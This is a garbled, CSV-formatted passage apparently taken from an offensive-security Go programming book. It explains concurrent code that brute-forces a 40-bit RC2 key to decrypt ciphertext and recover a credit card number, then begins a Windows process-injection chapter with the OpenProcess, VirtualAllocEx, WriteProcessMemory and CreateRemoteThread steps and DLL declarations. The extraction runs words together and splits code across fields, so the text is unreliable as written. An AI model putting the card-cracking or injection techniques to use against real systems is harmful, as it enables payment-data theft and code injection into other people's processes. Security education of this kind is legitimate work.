"Youpopulateyourworkchannelwithinagoroutine❸, ",NA,NA
includingacallto,deferwg.Done(),NA
❹tonotifyyour,WaitGroup,NA
whenthegoroutineexits.Thiswillpreventdeadlockslateras ,NA,NA
youtrytocontinueexecutionfromyour,main(),NA
function.You,NA,NA
useyour,start(),NA
and,stop(),NA
valuestoiterateasubsectionofthekey ,NA,NA
spacebyusinga,for,NA
loop❺.Everyiterationoftheloop ,NA,NA
incrementsthe,i,NA
variableuntilyou’vereachedyourending,NA,NA
offset.,NA,NA
"Aswementionedpreviously,yourkeyspaceis40bits,but ",i,NA
is64bits.Thissizedifferenceiscrucialtounderstand.You,NA,NA
don’thaveanativeGotypethatis40bits.Youhaveonly32-,NA,NA
or64-bittypes.Since32bitsistoosmalltoholda40-bit ,NA,NA
"value,youneedtouseyour64-bittypeinstead,andaccount",NA,NA
fortheextra24bitslater.Perhapsyoucouldavoidthiswhole ,NA,NA
challengeifyoucoulditeratetheentirekeyspacebyusinga ,[]byte,NA
insteadofa,uint64,NA
.Butdoingsowouldlikelyrequiresome,NA,NA
funkybitwiseoperationsthatmayovercomplicatethe ,NA,NA
"example.So,you’lldealwiththelengthnuanceinstead.",NA,NA
"Withinyourloop,youincludea",select,NA
statement❻thatmay ,NA,NA
"looksillyatfirst,becauseit’soperatingonchanneldataand ",NA,NA
doesn’tfitthetypicalsyntax.Youuseittocheckwhetheryour ,done,NA
channelhasbeenclosedvia,case<-done,NA
❼.Ifthechannelis ,NA,NA
"closed,youissuea",return,NA
statementtobreakoutofyour,NA,NA
goroutine.Whenthe,done,NA
"channelisn’tclosed,youusethe ",default,NA
case❽tocreatethecryptoinstancesnecessarytodefine ,NA,NA
"work.Specifically,youcall","binary.BigEndian.PutUint64(key,i)",NA
❾to ,NA,NA
writeyour,uint64,NA
value(thecurrentkey)toa,[]byte,NA
named,key,NA
.,NA,NA
"Althoughwedidn’texplicitlycallitoutearlier,you ",NA,NA
initialized,key,NA
asan8-byteslice.Sowhyareyoudefiningthe,NA,NA
sliceas8byteswhenyou’redealingwithonlya5-bytekey? ,NA,NA
"Well,since",binary.BigEndian.PutUint64,NA
takesa,uint64,NA
"value,it",NA,NA
requiresadestinationsliceof8bytesinlengthorelseit ,NA,NA
throwsanindex-out-of-rangeerror.Itcan’tfitan8-bytevalue ,NA,NA
"intoa5-byteslice.So,yougiveitan8-byteslice.Notice ",NA,NA
"throughouttheremainderofthecode,youuseonlythelast5 ",NA,NA
bytesofthe,key,NA
"slice;eventhoughthefirst3byteswillbezero,",NA,NA
theywillstillcorrupttheausterityofourcryptofunctionsif ,NA,NA
included.Thisiswhyyoucall,"rc2.New(key[3:],40)",NA
tocreateyour,NA,NA
cipherinitially;doingsodropsthe3irrelevantbytesandalso ,NA,NA
"passesinthelength,inbits,ofyourkey:40.Youusethe ",NA,NA
resulting,cipher.Block,NA
instanceandtherelevantkeybytesto,NA,NA
createa,CryptoData,NA
"object,andyouwriteittothe",out,NA
worker,NA,NA
channel❿.,NA,NA
That’sitfortheproducercode.Noticethatinthissection ,NA,NA
you’reonlybootstrappingtherelevantkeydataneeded.,NA,NA
Nowhereinthefunctionareyouactuallyattemptingtodecrypt ,NA,NA
theciphertext.You’llperformthisworkinyourconsumer ,NA,NA
function.,NA,NA
PerformingWorkandDecryptingData,NA,NA
Let’sreviewtheconsumerfunctionnow(,NA,NA
Listing11-10,NA,NA
). ,NA,NA
"Again,you’lladdthisfunctiontothesamefileasyour ",NA,NA
previouscode.,"❶funcdecrypt(ciphertext[]byte,in<-chan*CryptoData,\ 
 donechanstruct{},wg*sync.WaitGroup){
  
 size:=rc2.BlockSize
  
 plaintext:=make([]byte,len(ciphertext))
  
  
 ❷wg.Add(1) 
  
 gofunc(){
  
   
 ❸deferwg.Done()
  
   
 ❹fordata:=rangein{ 
  
 select{
  
    
 ❺case<-done: 
  
 return
  
    
 ❻default:
  
     
 ❼data.block.Decrypt(plaintext[:size],ciphertext[:size])
     
 ❽ifnumeric.Match(plaintext[:size]){
  
     
  
 ❾data.block.Decrypt(plaintext[size:],ciphertext[size:])
  
     
 ❿ifluhn.Valid(string(plaintext))&&\ 
  
 numeric.Match(plaintext[size:]){
  
 fmt.Printf(""Card[%s]foundusingkey[%x]\n"",/ 
 plaintext,data.key) 
  
 close(done) 
  
 return 
  
 } 
  
 } 
  
 }
  
 }",NA
"Yourconsumerfunction,named",decrypt(),NA
"❶,acceptsseveral ",NA,NA
parameters.Itreceivestheciphertextyouwishtodecrypt.It ,NA,NA
alsoacceptstwoseparatechannels:aread-only,*CryptoData,NA
channelnamed,in,NA
thatyou’lluseasaworkqueueanda,NA,NA
channelnamed,done,NA
thatyou’lluseforsendingandreceiving,NA,NA
"explicitcancellationsignals.Lastly,italsoacceptsa ",*sync.WaitGroup,NA
named,wg,NA
thatyou’lluseformanagingyour,NA,NA
"consumerworkers,muchlikeyourproducerimplementation. ",NA,NA
Youtellyour,WaitGroup,NA
thatyou’restartingaworkerbycalling ,wg.Add(1),NA
"❷.Thisway,you’llbeabletotrackandmanageall ",NA,NA
theconsumersthatarerunning.,NA,NA
"Next,insideyourgoroutine,youcall",deferwg.Done(),NA
❸so ,NA,NA
"thatwhenthegoroutinefunctionends,you’llupdatethe ",WaitGroup,NA
"state,reducingthenumberofrunningworkersby",NA,NA
one.This,WaitGroup,NA
businessisnecessaryforyouto,NA,NA
synchronizetheexecutionofyourprogramacrossanarbitrary ,NA,NA
numberofworkers.You’llusethe,WaitGroup,NA
inyour,main(),NA
functionlatertowaitforyour,goroutines,NA
tocomplete.,NA,NA
Theconsumerusesa,for,NA
loop❹torepeatedlyread,CryptoData,NA
workstructsfromthe,in,NA
channel.Theloopstopswhenthe,NA,NA
channelisclosed.Recallthattheproducerpopulatesthis ,NA,NA
"channel.Asyou’llseeshortly,thischannelclosesafterthe ",NA,NA
producershaveiteratedtheirentirekeyspacesubsectionsan,NA,NA
d pushedtherelativecryptodataontotheworkchannel.,NA,NA
"Therefore,yourconsumerloopsuntiltheproducersaredon",NA,NA
e producing.,NA,NA
"Asyoudidintheproducercode,youusea",select,NA
statement,NA,NA
withinthe,for,NA
looptocheckwhetherthe,done,NA
channelhasbeen ,NA,NA
"closed❺,andifithas,youexplicitlysignaltheconsumerto ",NA,NA
stopadditionalworkefforts.Aworkerwillclosethechannel ,NA,NA
"whenavalidcreditcardnumberhasbeenidentified,aswe’ll ",NA,NA
discussinamoment.Your,default,NA
case❻performsthecrypto ,NA,NA
"heavylifting.First,itdecryptsthefirstblock(8bytes)of ",NA,NA
"ciphertext❼,checkingwhethertheresultingplaintextisan8-",NA,NA
"byte,numericvalue❽.Ifitis,youhaveapotentialcard ",NA,NA
numberandproceedtodecryptthesecondblockofciphertext,NA,NA
❾.Youcallthesedecryptionfunctionsbyaccessingthe ,cipher.Block,NA
fieldwithinyour,CryptoData,NA
workobjectthatyouread,NA,NA
infromthechannel.Recallthattheproducerinstantiatedthe ,NA,NA
structbyusingauniquekeyvaluetakenfromthekeyspace.,NA,NA
"Lastly,youvalidatetheentiretyoftheplaintextagainstthe ",NA,NA
Luhnalgorithmandvalidatethatthesecondblockofplaintext ,NA,NA
"isan8-byte,numericvalue❿.Ifthesecheckssucceed,you ",NA,NA
canbereasonablysurethatyoufoundavalidcreditcard ,NA,NA
number.Youdisplaythecardnumberandthekeyto,stdout,NA
and,NA,NA
call,close(done),NA
tosignaltheothergoroutinesthatyou’vefound,NA,NA
whatyou’reafter.,NA,NA
WritingtheMainFunction,NA,NA
"Bythispoint,youhaveyourproducerandconsumerfunctions, ",NA,NA
"bothequippedtoexecutewithconcurrency.Now,let’stieitall ",NA,NA
togetherinyour,main(),NA
function(,NA,NA
Listing11-11,NA,NA
"),whichwill",NA,NA
appearinthesamesourcefileasthepreviouslistings.,"funcmain(){
  
  
 var(
  
  
 errerror",NA
Your,main(),NA
"functiondecodesyourciphertext,representeda",NA,NA
s ,NA,NA
"ahexadecimalstring❶.Next,youcreateseveralvariables❷.",NA,NA
Firstyoucreate,WaitGroup,NA
variablesusedfortrackingboth,NA,NA
producerandconsumergoroutines.Youalsodefineseveral ,uint64,NA
valuesfortrackingtheminimumvalueina40-bitkey,NA,NA
"space(0x0000000000),themaximumvalueinthekeyspace ",NA,NA
"(0xffffffffff),andthenumberofproducersyouintendtostart, ",NA,NA
inthiscase,75,NA
.Youusethesevaluestocalculateastepor,NA,NA
"range,whichrepresentsthenumberofkeyseachproducerwill ",NA,NA
"iterate,sinceyourintentistodistributetheseeffortsuniforml",NA,NA
y acrossallyourproducers.Youalsocreatea,*CryptoData,NA
work,NA,NA
channelanda,done,NA
signalingchannel.You’llpassthesearound,NA,NA
toyourproducerandconsumerfunctions.,NA,NA
Sinceyou’redoingbasicintegermathtocalculateyour ,NA,NA
"stepvaluefortheproducers,there’sachancethatyou’lllose ",NA,NA
somedataifthekeyspacesizeisn’tamultipleofthenumber ,NA,NA
ofproducersyou’llspinup.Toaccountforthis—andtoavoid ,NA,NA
losingprecisionwhileconvertingtoafloating-pointnumber ,NA,NA
foruseinacallto,math.Ceil(),NA
—youcheckwhetherthemaximum,NA,NA
key(,step*prods,NA
)islessthanyourmaximumvaluefortheentire ,NA,NA
"keyspace(0xffffffffff)❸.Ifitis,ahandfulofvaluesinthe ",NA,NA
keyspacewon’tbeaccountedfor.Yousimplyincreaseyour ,step,NA
valuetoaccountforthisshortage.Youinitializetwo,NA,NA
"variables,",start,NA
and,end,NA
",tomaintainthebeginningandending",NA,NA
offsetsyoucanusetobreakapartthekeyspace.,NA,NA
Themathtoarriveatyouroffsetsandstepsizeisn’tprecise ,NA,NA
"byanymeans,anditcouldcauseyourcodetosearchbeyond ",NA,NA
"theendofthemaximumallowablekeyspace.However,you",NA,NA
fixthatwithina,for,NA
loop❹usedtostarteachoftheproducers. ,NA,NA
"Intheloop,youadjustyourendingstepvalue,",end,NA
",shouldthat",NA,NA
valuefallbeyondthemaximumallowedkeyspacevalue.Each ,NA,NA
iterationoftheloopcalls,generate(),NA
"❺,yourproducerfunction, ",NA,NA
andpassestoitthestart(,start,NA
)andend(,end,NA
)keyspaceoffsets,NA,NA
forwhichtheproducerwilliterate.Youalsopassityour,work,NA
and,done,NA
"channels,aswellasyourproducer",WaitGroup,NA
.After,NA,NA
"callingthefunction,youshiftyour",start,NA
and,end,NA
variablesto,NA,NA
accountforthenextrangeofkeyspacethatwillbepassedtoa ,NA,NA
newproducer.Thisishowyoubreakupyourkeyspaceinto ,NA,NA
"smaller,moredigestibleportionsthattheprogramcanprocess ",NA,NA
"concurrently,withoutoverlappingeffortsbetweengoroutine",NA,NA
s.,NA,NA
"Afteryourproducersarespunup,youusea",for,NA
loopto ,NA,NA
"createyourworkers❻.Inthiscase,you’recreating30of ",NA,NA
"them.Foreachiteration,youcallyour",decrypt(),NA
"function❼, ",NA,NA
"passingtoittheciphertext,theworkchannel,thedone ",NA,NA
"channel,andtheconsumer",WaitGroup,NA
.Thisspinsupyour,NA,NA
"concurrentconsumers,whichbegintopullandprocesswor",NA,NA
k astheproducerscreateit.,NA,NA
Iteratingthroughtheentirekeyspacetakestime.Ifyou ,NA,NA
"don’thandlethingscorrectly,the",main(),NA
functionwillassuredly,NA,NA
"exitbeforeyoudiscoverakeyorexhaustkeyspace.So,you ",NA,NA
needtomakesuretheproducersandconsumershaveadequat,NA,NA
e timetoeitheriteratetheentirekeyspaceordiscoverthe ,NA,NA
correctkey.Thisiswhereyour,WaitGroups,NA
comein.Youcall ,prodWg.Wait(),NA
❽toblock,main(),NA
untiltheproducershave ,NA,NA
completedtheirtasks.Recallthattheproducershave ,NA,NA
completedtheirtasksiftheyeitherexhaustthekeyspaceor ,NA,NA
explicitlycanceltheprocessviathe,done,NA
channel.Afterthis,NA,NA
"completes,youexplicitlyclosethe",work,NA
channelsothe,NA,NA
consumerswon’tdeadlockcontinuallywhiletryingtoread ,NA,NA
"fromit.Finally,youblock",main(),NA
againbycalling,consWg.Wait(),NA
❾to,NA,NA
giveadequatetimefortheconsumersinyour,WaitGroup,NA
to ,NA,NA
completeanyremaining,work,NA
intheworkchannel.,NA,NA
RunningtheProgram,NA,NA
"You’vecompletedyourprogram!Ifyourunit,youshouldsee ",NA,NA
thefollowingoutput:,"$
 gorunmain.go
  
  
 2020/07/1214:27:47Startingproducers...
  
  
 2020/07/1214:27:47Producersstarted!
  
  
 2020/07/1214:27:47Startingconsumers...
  
  
 2020/07/1214:27:47Consumersstarted!
  
  
 2020/07/1214:27:47Nowwewait...
  
  
 2020/07/1214:27:48Card[4532651325506680]foundusingkey[e612d0bbb6]
  
  
 2020/07/1214:27:48Brute-forcecomplete",NA
Theprogramstartstheproducersandconsumersandthen ,NA,NA
"waitsforthemtoexecute.Whenacardisfound,theprogram ",NA,NA
displaysthecleartextcardandthekeyusedtodecryptthat ,NA,NA
"card.Sinceweassumethiskeyisthemagicalkeyforallcards, ",NA,NA
weinterruptexecutionprematurelyandcelebrateoursuccess ,NA,NA
bypaintingaself-portrait(notshown).,NA,NA
"Ofcourse,dependingonthekeyvalue,brute-forcingona ",NA,NA
homecomputercantakeasignificantamountoftime—think ,NA,NA
"daysorevenweeks.Fortheprecedingsamplerun,we ",NA,NA
narrowedthekeyspacetofindthekeymorequickly.,NA,NA
"However,completelyexhaustingthekeyspaceona2016 ",NA,NA
MacBookProtakesapproximatelysevendays.Nottoobadfor ,NA,NA
aquick-and-dirtysolutionrunningonalaptop.,NA,NA
SUMMARY,NA,NA
"Cryptoisanimportanttopicforsecuritypractitioners,even ",NA,NA
thoughthelearningcurvecanbesteep.Thischaptercovered ,NA,NA
"symmetricandasymmetriccrypto,hashing,password ",NA,NA
"handlingwithbcrypt,messageauthentication,mutual ",NA,NA
"authentication,andbrute-forcingRC2.Inthenextchapter, ",NA,NA
we’llgetintothenitty-grittyofattackingMicrosoftWindows.,NA,NA
12 ,NA,NA
WINDOWSSYSTEMINTERACTION ,NA,NA
ANDANALYSIS,NA,NA
TherearecountlesswaysofdevelopingMicrosoftWindows ,NA,NA
attacks—toomanytocoverinthischapter.Insteadof ,NA,NA
"discussingthemall,we’llintroduceandinvestigateafew ",NA,NA
"techniquesthatcanhelpyouattackWindows,whetherinitially ",NA,NA
orduringyourpost-exploitationadventures.,NA,NA
AfterdiscussingtheMicrosoftAPIdocumentationand ,NA,NA
"somesafetyconcerns,we’llcoverthreetopics.First,we’lluse ",NA,NA
Go’score,syscall,NA
packagetointeractwithvarioussystem-level,NA,NA
"WindowsAPIsbyperformingaprocessinjection.Second, ",NA,NA
we’llexploreGo’scorepackagefortheWindowsPortable ,NA,NA
Executable(PE)formatandwriteaPEfileformatparser. ,NA,NA
"Third,we’lldiscusstechniquesforusingCcodewithnative ",NA,NA
Gocode.You’llneedtoknowtheseappliedtechniquesin ,NA,NA
ordertobuildanovelWindowsattack.,NA,NA
THEWINDOWSAPI’S ,NA,NA
OPENPROCESS()FUNCTION,NA,NA
"InordertoattackWindows,youneedtounderstandthe ",NA,NA
WindowsAPI.Let’sexploretheWindowsAPIdocumentation ,NA,NA
byexaminingthe,OpenProcess(),NA
"function,usedtoobtainahandle",NA,NA
onaremoteprocess.Youcanfindthe,OpenProcess(),NA
documentationat,NA,NA
https://docs.microsoft.com/en-,NA,NA
us/windows/desktop/api/processthreadsapi/nf-,NA,NA
processthreadsapi-openprocess/,NA,NA
.,NA,NA
Figure12-1,NA,NA
showsthe ,NA,NA
function’sobjectpropertydetails.,"Figure12-1:TheWindowsAPIobjectstructurefor
 OpenProcess()",NA
"Inthisparticularinstance,wecanseethattheobjectlooks ",NA,NA
"verysimilartoastructtypeinGo.However,theC++struct ",NA,NA
"fieldtypesdon’tnecessarilyreconcilewithGotypes,and ",NA,NA
Microsoftdatatypesdon’talwaysmatchGodatatypes.,NA,NA
"TheWindowsdatatypedefinitionreference,locatedat ",NA,NA
https://docs.microsoft.com/en-,NA,NA
us/windows/desktop/WinProg/windows-data-,NA,NA
types/,NA,NA
",canbe",NA,NA
helpfulwhenreconcilingaWindowsdatatypewithGo’s ,NA,NA
respectivedatatype.,NA,NA
Table12-1,NA,NA
coversthetypeconversion ,NA,NA
we’lluseintheprocessinjectionexampleslaterinthis ,NA,NA
chapter.,"Table12-1:
 MappingWindowsDataTypestoGoDataTypes
  
 WindowsdataType 
  
 Godatatype
  
 BOOLEAN 
  
 byte
  
 BOOL 
  
 int32
  
 BYTE 
  
 byte
  
 DWORD 
  
 uint32
  
 DWORD32 
  
 uint32
  
 DWORD64 
  
 uint64
  
 WORD 
  
 uint16
  
 HANDLE 
  
 uintptr(unsignedintegerpointer)
  
 LPVOID 
  
 uintptr
  
 SIZE_T 
  
 uintptr
  
 LPCVOID 
  
 uintptr
  
 HMODULE 
  
 uintptr
  
 LPCSTR 
  
 uintptr
  
 LPDWORD 
  
 uintptr",NA
TheGodocumentationdefinesthe,uintptr,NA
datatypeas“an,NA,NA
integertypethatislargeenoughtoholdthebitpatternofany ,NA,NA
"pointer.”Thisisaspecialdatatype,asyou’llseewhenwe ",NA,NA
discussGo’s,unsafe,NA
packageandtypeconversionslaterin“The,NA,NA
unsafe.PointeranduintptrTypes”on,NA,NA
page266,NA,NA
".Fornow,let’s ",NA,NA
finishwalkingthroughtheWindowsAPIdocumentation.,NA,NA
"Next,youshouldlookatanobject’sparameters;the ",NA,NA
Parameterssectionofthedocumentationprovidesdetails.For ,NA,NA
"example,thefirstparameter,",dwDesiredAccess,NA
",providesspecifics",NA,NA
regardingthelevelofaccesstheprocesshandleshould ,NA,NA
"possess.Afterthat,theReturnValuesectiondefinesexpected ",NA,NA
valuesforbothasuccessfulandfailedsystemcall(,NA,NA
Figure12-2,NA,NA
).,Figure12-2:Thedefinitionfortheexpectedreturnvalue,NA
We’lltakeadvantageofa,GetLastError,NA
errormessagewhen,NA,NA
usingthe,syscall,NA
"packageinourupcomingexamplecode,",NA,NA
althoughthiswilldeviatefromthestandarderrorhandling ,NA,NA
(suchasif,err!=nil,NA
syntax)eversoslightly.,NA,NA
"OurlastsectionoftheWindowsAPIdocument, ",NA,NA
"Requirements,providesimportantdetails,asshownin",NA,NA
Figur,NA,NA
e 12-3,NA,NA
.Thelastlinedefinesthe,NA,NA
dynamiclinklibrary(DLL),NA,NA
", ",NA,NA
whichcontainsexportablefunctions(suchas,OpenProcess(),NA
)an,NA,NA
d,NA,NA
willbenecessarywhenwebuildoutourWindowsDLL ,NA,NA
"module’svariabledeclarations.Saidanotherway,wecannot ",NA,NA
calltherelevantWindowsAPIfunctionfromGowithout ,NA,NA
knowingtheappropriateWindowsDLLmodule.Thiswill ,NA,NA
becomeclearerasweprogressintoourupcomingprocess ,NA,NA
injectionexample.,Figure12-3:TheRequirementssectiondefinesthelibraryrequiredtocalltheAPI.,NA
THEUNSAFE.POINTERAND ,NA,NA
UINTPTRTYPES,NA,NA
IndealingwiththeGo,syscall,NA
"package,we’llmostcertainly",NA,NA
needtosteparoundGo’stype-safetyprotections.Thereasonis ,NA,NA
"thatwe’llneed,forexample,toestablishsharedmemory ",NA,NA
structuresandperformtypeconversionsbetweenGoandC.,NA,NA
Thissectionprovidesthegroundworkyouneedinorderto ,NA,NA
"manipulatememory,butyoushouldalsoexploreGo’sofficial ",NA,NA
documentationfurther.,NA,NA
We’llbypassGo’ssafetyprecautionsbyusingGo’s,unsafe,NA
package(mentionedin,NA,NA
Chapter9,NA,NA
"),whichcontainsoperation",NA,NA
s thatsteparoundthetypesafetyofGoprograms.Gohaslaid ,NA,NA
outfourfundamentalguidelinestohelpusout:,"Apointervalueofanytypecanbeconvertedtoanunsafe.Pointer. 
 Anunsafe.Pointercanbeconvertedtoapointervalueofanytype. 
 Auintptrcanbeconvertedtoanunsafe.Pointer.
  
 Anunsafe.Pointercanbeconvertedtoauintptr.
  
  
  
  
 WARNING
  
 Keep in mind that packages that import the
  unsafe
  package may not be 
 portable,andthatalthoughGotypicallyensuresGoversion1compatibility, 
 usingthe
 unsafe
 packagebreaksallguaranteesofthis.",NA
The,uintptr,NA
typeallowsyoutoperformtypeconversionor,NA,NA
"arithmeticbetweennativesafetypes,amongotheruses. ",NA,NA
Although,uintptr,NA
"isanintegertype,it’susedextensivelyto",NA,NA
representamemoryaddress.Whenusedwithtype-safe ,NA,NA
"pointers,Go’snativegarbagecollectorwillmaintainrelevant ",NA,NA
referencesatruntime.,NA,NA
"However,thesituationchangeswhen",unsafe.Pointer,NA
is,NA,NA
introduced.Recallthat,uintptr,NA
isessentiallyjustanunsigned,NA,NA
integer.Ifapointervalueiscreatedusing,unsafe.Pointer,NA
andthen,NA,NA
assignedto,uintptr,NA
",there’snoguaranteethatGo’sgarbage",NA,NA
collectorwillmaintaintheintegrityofthereferencedmemory ,NA,NA
location’svalue.,NA,NA
Figure12-4,NA,NA
helpstofurtherdescribethe ,NA,NA
issue.,NA,NA
Thetophalfoftheimagedepicts,uintptr,NA
withareference ,NA,NA
"valuetoaGotype-safepointer.Assuch,itwillmaintainits ",NA,NA
"referenceatruntime,alongwithausteregarbagecollection. ",NA,NA
Thelowerhalfoftheimagedemonstratesthat,uintptr,NA
",although ",NA,NA
itreferencesan,unsafe.Pointer,NA
"type,canbegarbagecollected, ",NA,NA
consideringGodoesn’tpreservenormanagepointersto ,NA,NA
arbitrarydatatypes.,NA,NA
Listing12-1,NA,NA
representstheissue.,"funcstate(){ 
  
 varonload=createEvents(""onload"")❶var
 receive=createEvents(""receive"")❷varsu
 ccess=createEvents(""success"")❸
  
  
 mapEvents:=make(map[string]interface{})
  
  
 mapEvents[""messageOnload""]=unsafe.Pointer(onload) 
  
 mapEvents[""messageReceive""]=unsafe.Pointer(receive)❹
  
 mapEvents[""messageSuccess""]=uintptr(unsafe.Pointer(success))❺
  
  
 //Thislineissafe-retainsorginalvalue",NA
Thiscodelistingcouldbesomeone’sattemptatcreatinga ,NA,NA
"statemachine,forexample.Ithasthreevariables,assigned ",NA,NA
theirrespectivepointervaluesof,onload,NA
"❶,",receive,NA
"❷,and",success,NA
❸bycallingthe,createEvents(),NA
❽function.Wethencreatea ,NA,NA
mapcontainingakeyoftype,string,NA
alongwithavalueoftype,interface{},NA
.Weusethe,interface{},NA
typebecauseitcanreceive,NA,NA
"disparatedatatypes.Inthiscase,we’lluseittoreceiveboth ",unsafe.Pointer,NA
❹and,uintptr,NA
❺values.,NA,NA
"Atthispoint,youmostlikelyhavespottedthedangerous ",NA,NA
piecesofcode.Althoughthe,"mapEvents[""messageRecieve""]",NA
map ,NA,NA
entry❹isoftype,unsafe.Pointer,NA
",itstillmaintainsitsoriginal ",NA,NA
referencetothe,receive,NA
❷variableandwillprovidethesame ,NA,NA
"consistentoutput❻asitdidoriginally.Contrarily,the ","mapEvents[""messageSuccess""]",NA
mapentry❺isoftype,uintptr,NA
.This ,NA,NA
meansthatassoonasthe,unsafe.Pointer,NA
valuereferencingthe ,success,NA
variableisassignedtoa,uintptr,NA
"type,the",success,NA
variable❸i,NA,NA
"sfreetobegarbagecollected.Again,",uintptr,NA
isjustatype,NA,NA
"holdingaliteralintegerofamemoryaddress,notareference ",NA,NA
"toapointer.Asaresult,there’snoguaranteethattheexpected ",NA,NA
"output❼willbeproduced,asthevaluemaynolongerbe",NA,NA
present.,NA,NA
Isthereasafewaytouse,uintptr,NA
with,unsafe.Pointer,NA
?Wecando,NA,NA
sobytakingadvantageof,runtime.Keepalive,NA
",whichcanprevent",NA,NA
thegarbagecollectionofavariable.Let’stakealookatthisby,NA,NA
modifyingourpriorcodeblock(,NA,NA
Listing12-2,NA,NA
).,"funcstate(){
  
 varonload=createEvents(""onload"")
  
 varreceive=createEvents(""receive"") 
 varsuccess❶=createEvents(""success"")
  
 mapEvents:=make(map[string]interface{})
  
 mapEvents[""messageOnload""]=unsafe.Pointer(onload)
  
 mapEvents[""messageReceive""]=unsafe.Pointer(receive) 
  
 mapEvents[""messageSuccess""]=uintptr(unsafe.Pointer(success))❷
  
 //Thislineissafe-retainsorginalvalue
  
 fmt.Println(*(*string)(mapEvents[""messageReceive""].(unsafe.Pointer)))
  
  
 //Thislineisunsafe-originalvaluecouldbegarbagecollected
  
 fmt.Println(*(*string)(unsafe.Pointer(mapEvents[""messageSuccess""].(uintptr))))
  
 runtime.KeepAlive(success)❸
  
 }
  
  
 funccreateEvents(sstring)*string{
  
 return&s
  
 }
  
 Listing12-2:
 Listing7-2
 :Usingthe
 runtime.KeepAlive()
 functiontopreventgarbage
  
 collectionofavariable",NA
"Seriously,we’veaddedonlyonesmalllineofcode❸!",NA,NA
"Thisline,",runtime.KeepAlive(success),NA
",tellstheGoruntimetoensure",NA,NA
thatthe,success,NA
variableremainsaccessibleuntilit’sexplicitly,NA,NA
releasedortherunstateends.Thismeansthatalthoughthe ,success,NA
variable❶isstoredas,uintptr,NA
"❷,itcan’tbegarbage",NA,NA
collectedbecauseoftheexplicit,runtime.KeepAlive(),NA
directive.,NA,NA
BeawarethattheGo,syscall,NA
packageextensivelyuses,uintptr(unsafe.Pointer()),NA
"throughout,andalthoughcertainfunctions,",NA,NA
like,syscall9(),NA
",havetypesafetythroughexception,notallthe",NA,NA
"functionsemploythis.Further,asyouhackaboutyourown ",NA,NA
"projectcode,you’llalmostcertainlyrunintosituationsthat ",NA,NA
warrantmanipulatingheaporstackmemoryinanunsafe ,NA,NA
manner.,NA,NA
PERFORMINGPROCESSINJECTION ,NA,NA
WITHTHESYSCALLPACKAGE,NA,NA
"Often,weneedtoinjectourowncodeintoaprocess.This ",NA,NA
maybebecausewewanttogainremotecommandlineaccess ,NA,NA
"toasystem(shell),orevendebugaruntimeapplicationwhen ",NA,NA
thesourcecodeisn’tavailable.Understandingthemechanics ,NA,NA
ofprocessinjectionwillalsohelpyouperformmore ,NA,NA
"interestingtasks,suchasloadingmemory-",NA,NA
residentmalwareor ,NA,NA
"hookingfunctions.Eitherway,thissectiondemonstrateshow ",NA,NA
touseGotointeractwiththeMicrosoftWindowsAPIsin ,NA,NA
ordertoperformprocessinjection.We’llinjectapayload ,NA,NA
storedonadiskintoexistingprocessmemory.,NA,NA
Figure12-5 ,NA,NA
describestheoverallchainofevents.,NA,NA
"Instep1,weusethe",OpenProcess(),NA
Windowsfunctionto ,NA,NA
"establishaprocesshandle,alongwiththedesiredprocess ",NA,NA
accessrights.Thisisarequirementforprocess-level ,NA,NA
"interaction,whetherwe’redealingwithalocalorremote",NA,NA
process.,NA,NA
"Oncetherequisiteprocesshandlehasbeenobtained,we ",NA,NA
"useitinstep2,alongwiththe",VirtualAllocEx(),NA
Windows,NA,NA
"function,toallocatevirtualmemorywithintheremoteprocess",NA,NA
". Thisisarequirementforloadingbyte-levelcode,suchas ",NA,NA
"shellcodeoraDLL,intotheremoteprocesses’memory.",NA,NA
"Instep3,weloadbyte-levelcodeintomemorybyusing ",NA,NA
the,WriteProcessMemory(),NA
Windowsfunction.Atthispointinthe,NA,NA
"injectionprocess,we,asattackers,gettodecidehowcreative ",NA,NA
tobewithourshellcodeorDLL.Thisisalsotheplacewhere ,NA,NA
youmightneedtoinjectdebuggingcodewhenattemptingto ,NA,NA
understandarunningprogram.,NA,NA
"Finally,instep4,weusethe",CreateRemoteThread(),NA
Windows,NA,NA
functionasameanstocallanativeexportedWindowsDLL ,NA,NA
"function,suchas",LoadLibraryA(),NA
",locatedin",NA,NA
Kernel32.dll,NA,NA
",sothat",NA,NA
wecanexecutethecodepreviouslyplacedwithintheprocess ,NA,NA
byusing,WriteProcessMemory(),NA
.,NA,NA
Thefourstepswejustdescribedprovideafundamental ,NA,NA
processinjectionexample.We’lldefineafewadditionalfiles ,NA,NA
andfunctionswithinouroverallprocessinjectionexampletha,NA,NA
t ,NA,NA
"aren’tnecessarilydescribedhere,althoughwe’lldescribethe",NA,NA
m indetailasweencounterthem.,NA,NA
DefiningtheWindowsDLLsandAssigning ,NA,NA
Variables,NA,NA
Thefirststepistocreatethe,NA,NA
winmods,NA,NA
filein,NA,NA
Listing12-3,NA,NA
. ,NA,NA
(Allthecodelistingsattherootlocationof/existunderthe ,NA,NA
providedgithubrepo,NA,NA
https://github.com/blackhat-,NA,NA
go/bhg/,NA,NA
.) ,NA,NA
"ThisfiledefinesthenativeWindowsDLL,whichmaintains ",NA,NA
"exportedsystem-levelAPIs,thatwe’llcallbyusingtheGo",NA,NA
package.The,NA,NA
winmods,NA,NA
filecontainsdeclarationsand,NA,NA
assignmentsofmoreWindowsDLLmodulereferencesthan ,NA,NA
"requiredforoursampleproject,butwe’lldocumentthemso",NA,NA
thatyoucanleveragethoseinmoreadvancedinjectioncode.,"import""syscall""
  
  
 var(
  
 ❶ModKernel32=syscall.NewLazyDLL(""kernel32.dll"") 
 modUser32=syscall.NewLazyDLL(""user32.dll"")
  
 modAdvapi32=syscall.NewLazyDLL(""Advapi32.dll"")
  
 ProcOpenProcessToken=modAdvapi32.NewProc(""GetProcessToken"") 
 ProcLookupPrivilegeValueW= 
  
 modAdvapi32.NewProc(""LookupPrivilegeValueW"") 
  
 ProcLookupPrivilegeNameW= 
  
 modAdvapi32.NewProc(""LookupPrivilegeNameW"") 
  
 ProcAdjustTokenPrivileges= 
  
 modAdvapi32.NewProc(""AdjustTokenPrivileges"") 
  
 ProcGetAsyncKeyState=modUser32.NewProc(""GetAsyncKeyState"") 
 ProcVirtualAlloc=ModKernel32.NewProc(""VirtualAlloc"") 
  
 ProcCreateThread=ModKernel32.NewProc(""CreateThread"") 
  
 ProcWaitForSingleObject=ModKernel32.NewProc(""WaitForSingleObject"") 
 ProcVirtualAllocEx=ModKernel32.NewProc(""VirtualAllocEx"") 
  
 ProcVirtualFreeEx=ModKernel32.NewProc(""VirtualFreeEx"") 
  
 ProcCreateRemoteThread=ModKernel32.NewProc(""CreateRemoteThread"") 
